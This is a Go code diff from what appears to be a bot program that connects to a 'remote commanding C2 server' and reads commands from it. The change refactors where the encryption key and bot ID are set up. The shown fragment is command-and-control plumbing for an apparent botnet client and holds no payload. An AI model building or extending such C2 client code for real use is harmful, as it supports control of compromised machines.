@@ -4,9 +4,7 @@ import (
 	cli "bot/communication/client"
 	srv "bot/communication/server"
 	msg "bot/message"
-	"crypto/rand"
 	"fmt"
-	ccp "golang.org/x/crypto/chacha20poly1305"
 	"net"
 	"sync"
 )
@@ -16,20 +14,8 @@ const (
 )
 
 var (
-	wg        sync.WaitGroup
-	B         msg.Bot
-	key       = make([]byte, ccp.KeySize)
-	connected bool
+	wg sync.WaitGroup
 )
-
-func init() {
-	// Generate a random key
-	if _, err := rand.Read(key); err != nil {
-		panic(err)
-	}
-	msg.Aead = msg.GenerateAead(key)
-	B.GenerateRandomUid()
-}
 
 // tryConnect tries to connect to the remote commanding C2 server
 func tryConnect() {
@@ -39,7 +25,7 @@ func tryConnect() {
 	} else {
 		return
 	}
-	cli.WriteData(remoteServer, &B)
+	cli.WriteData(remoteServer, &msg.B)
 }
 
 func main() {
@@ -67,7 +53,7 @@ func main() {
 		defer conn.Close()
 
 		fmt.Println("Accepted connection from ", conn.RemoteAddr())
-		commands, err := srv.ReadCommands(conn, &B)
+		commands, err := srv.ReadCommands(conn, &msg.B)
 
 		// edode : Commanding server has closed connection
 		if err != nil {
